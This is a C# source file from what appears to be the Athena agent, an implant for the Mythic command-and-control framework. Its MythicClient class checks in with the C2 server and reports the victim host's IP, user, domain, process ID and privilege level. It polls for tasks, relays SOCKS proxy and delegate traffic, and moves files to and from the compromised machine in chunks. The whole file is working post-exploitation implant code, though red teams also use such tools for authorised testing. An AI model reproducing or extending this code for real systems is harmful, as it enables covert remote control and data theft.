using Athena.Config;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;

namespace Athena
{
    public class MythicClient
    {
        public MythicConfig MythicConfig { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new MythicConfig();
        }

        #region Communication Functions      
        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<CheckinResponse> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = Misc.getIntegrity(),
            };

            try
            {
                var responseString = await this.MythicConfig.currentConfig.Send(ct);

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if (cs is null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",
                    };
                }
                return cs;
            }
            catch (Exception e)
            {
                return new CheckinResponse();
            }
        }

        /// <summary>
        /// Perform a get tasking action with the Mythic server to return current responses and check for new tasks
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        /// <param name="delegateMessages">List of DelegateMessages</param>
        /// <param name="socksMessage">List of SocksMessages</param>
        public async Task<List<MythicTask>> GetTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
        {
            List<ResponseResult> responseResults = GetResponses(jobs);
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages,
                socks = socksMessage,
                responses = responseResults
            };

            try
            {
                string responseString = this.MythicConfig.currentConfig.Send(gt).Result;

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }

                return await HandleGetTaskingResponse(responseString);
            }
            catch (Exception e)
            {
                return null;
            }
        }
        #endregion
        #region Helper Functions

        /// <summary>
        /// Parse the GetTaskingResponse and forward them to the required places
        /// </summary>
        /// <param name="responseString">Response from the Mythic server</param>
        private static async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
        {
            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
            if (gtr is null)
            {
                return null;
            }

            if (gtr.delegates is not null && gtr.delegates.Count > 0)
            {
                try
                {
                    HandleDelegates(gtr.delegates);
                }
                catch (Exception e)
                {

                }
            }
            //Pass up socks messages
            if (gtr.socks is not null && gtr.socks.Count > 0)
            {
                try
                {
                    HandleSocks(gtr.socks);
                }
                catch (Exception e)
                {

                }
            }
            if (gtr.responses is not null)
            {
                try
                {
                    HandleMythicResponses(gtr.responses);
                }
                catch (Exception e)
                {
                }
            }
            return gtr.tasks;
        }

        /// <summary>
        /// Create a list of ResponseResults to return to the Mythic server
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        private static List<ResponseResult> GetResponses(List<MythicJob> jobs)
        {
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach (var job in jobs)
            {
                try
                {
                    switch (job.task.command)
                    {
                        case "upload":
                            MythicUploadJob uj = Globals.uploadJobs[job.task.id];

                            if (!uj.uploadStarted)
                            {
                                UploadResponse ur = new UploadResponse()
                                {
                                    task_id = uj.task.id,
                                    upload = new UploadResponseData()
                                    {
                                        chunk_size = 512000,
                                        chunk_num = -1,
                                        file_id = uj.file_id,
                                        full_path = uj.path
                                    }
                                };
                                lrr.Add(ur);
                            }
                            else if (uj.complete)
                            {
                                UploadResponse ur = new UploadResponse()
                                {
                                    task_id = uj.task.id,
                                    upload = new UploadResponseData()
                                    {
                                        chunk_size = 512000,
                                        chunk_num = uj.chunk_num,
                                        file_id = uj.file_id,
                                        full_path = uj.path
                                    },
                                    completed = "true"

                                };
                                lrr.Add(ur);
                            }
                            else
                            {
                                UploadResponse ur = new UploadResponse()
                                {
                                    task_id = uj.task.id,
                                    upload = new UploadResponseData()
                                    {
                                        chunk_size = 512000,
                                        chunk_num = uj.chunk_num,
                                        file_id = uj.file_id,
                                        full_path = uj.path
                                    },
                                };
                                uj.uploadStarted = true;
                                lrr.Add(ur);
                            }

                            break;
                        case "download":
                            MythicDownloadJob j = Globals.downloadJobs[job.task.id];

                            //Initiate Download
                            if (!j.downloadStarted)
                            {
                                DownloadResponse dr = new DownloadResponse()
                                {
                                    task_id = job.task.id,
                                    completed = "",
                                    user_output = "",
                                    status = "",
                                    total_chunks = j.total_chunks,
                                    full_path = j.path,
                                    chunk_num = 0,
                                    chunk_data = "",
                                    file_id = "",
                                };
                                lrr.Add(dr);
                                j.downloadStarted = true;
                            }
                            else
                            {
                                //We're on the final chunk
                                if (j.chunk_num == j.total_chunks)
                                {
                                    DownloadResponse dr = new DownloadResponse()
                                    {
                                        task_id = job.task.id,
                                        user_output = "",
                                        status = "",
                                        full_path = "",
                                        chunk_num = j.chunk_num,
                                        chunk_data = job.taskresult,
                                        file_id = j.file_id,
                                        completed = "true",
                                        total_chunks = -1

                                    };
                                    lrr.Add(dr);
                                }
                                //Upload next chunk
                                else
                                {
                                    DownloadResponse dr = new DownloadResponse()
                                    {
                                        task_id = job.task.id,
                                        user_output = "",
                                        status = "",
                                        total_chunks = -1,
                                        full_path = "",
                                        chunk_num = j.chunk_num,
                                        chunk_data = job.taskresult,
                                        file_id = j.file_id
                                    };
                                    lrr.Add(dr);
                                }
                            }
                            break;
                        default:
                            if (job.errored)
                            {
                                ResponseResult rr = new ResponseResult()
                                {
                                    task_id = job.task.id,
                                    status = "error",
                                    completed = "true",
                                    user_output = job.taskresult
                                };
                                lrr.Add(rr);
                            }
                            else if (job.complete)
                            {
                                if (job.task.command == "load")
                                {
                                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                                    CommandsResponse cr = new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = lc.command,
                                    };
                                    LoadCommandResponseResult rr = new LoadCommandResponseResult()
                                    {
                                        task_id = job.task.id,
                                        completed = "true",
                                        user_output = job.taskresult,
                                        commands = new List<CommandsResponse>() { cr }
                                    };
                                    lrr.Add(rr);
                                }
                                else
                                {
                                    ResponseResult rr = new ResponseResult()
                                    {
                                        task_id = job.task.id,
                                        completed = "true",
                                        user_output = job.taskresult,
                                        status = "complete"
                                    };
                                    lrr.Add(rr);
                                }
                            }
                            else
                            {
                                ResponseResult rr = new ResponseResult()
                                {
                                    task_id = job.task.id,
                                    user_output = job.taskresult,
                                    status = "processed"
                                };
                                lrr.Add(rr);
                            }
                            break;
                    };
                }
                catch (Exception e)
                {

                }
            }
            return lrr;
        }

        /// <summary>
        /// Handles SOCKS messages received from the Mythic server
        /// </summary>
        /// <param name="socks">List of SocksMessages</param>
        private static async Task HandleSocks(List<SocksMessage> socks)
        {
            //I can have multiple socks messages for the same connection ID
            foreach(var sock in socks){
                Console.WriteLine(sock.server_id + ":" + sock.exit);
                await Globals.socksHandler.HandleMessage(sock);
            }
        }

        /// <summary>
        /// Handle delegate messages received from the Mythic server
        /// </summary>
        /// <param name="delegates">List of DelegateMessages</param>
        private static async Task HandleDelegates(List<DelegateMessage> delegates)
        {
            Parallel.ForEach(delegates, async del =>
            {
                await Globals.mc.MythicConfig.forwarder.ForwardDelegateMessage(del);
            });
        }

        /// <summary>
        /// Handle response result messages received from the Mythic server
        /// </summary>
        /// <param name="responses">List of MythicResponseResults</param>
        private static async Task HandleMythicResponses(List<MythicResponseResult> responses)
        {
            foreach(var response in responses)
            {
                if (Globals.uploadJobs.ContainsKey(response.task_id))
                {
                    await HandleUpload(response);
                }

                if (Globals.downloadJobs.ContainsKey(response.task_id))
                {
                    await HandleDownload(response);
                }
            }
        }

        /// <summary>
        /// Handle file upload tasks received from the Mythic server
        /// </summary>
        /// <param name="response">MythicResponseResult containing the required inforamtion</param>
        private static async Task HandleUpload(MythicResponseResult response)
        {
            MythicUploadJob uploadJob = Globals.uploadJobs[response.task_id];
            MythicJob mythicJob = Globals.jobs[response.task_id];
            if (uploadJob.complete)
            {
                Globals.uploadJobs.Remove(response.task_id);
                return;
            }

            if (uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks;
            }

            if (!String.IsNullOrEmpty(response.chunk_data))
            {
                uploadJob.uploadStarted = true;
                uploadJob.uploadChunk(Misc.Base64DecodeToByteArray(response.chunk_data), ref mythicJob);
                mythicJob.complete = uploadJob.complete;
                mythicJob.hasoutput = true;
                mythicJob.taskresult = "";
            }
            else
            {
                mythicJob.hasoutput = true;
                mythicJob.taskresult = "";
            }
        }

        /// <summary>
        /// Handle file download tasks received from the Mythic server
        /// </summary>
        /// <param name="response">MythicResponseResult containing the required inforamtion</param>
        private static async Task HandleDownload(MythicResponseResult response)
        {
            MythicDownloadJob downloadJob = Globals.downloadJobs[response.task_id];
            MythicJob mythicJob = Globals.jobs[response.task_id];

            if (downloadJob.complete)
            {
                Globals.downloadJobs.Remove(response.task_id);
                return;
            }

            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                if (!String.IsNullOrEmpty(response.file_id))
                {
                    downloadJob.file_id = response.file_id;
                    downloadJob.hasoutput = false;
                }
            }
            else
            {
                if (response.status == "success")
                {
                    if (downloadJob.chunk_num != downloadJob.total_chunks)
                    {
                        downloadJob.chunk_num++;
                        mythicJob.taskresult = await downloadJob.DownloadNextChunk();
                        mythicJob.errored = downloadJob.errored;
                        mythicJob.hasoutput = true;
                        mythicJob.complete = downloadJob.complete;
                    }
                }
            }
        }
        #endregion
    }
}
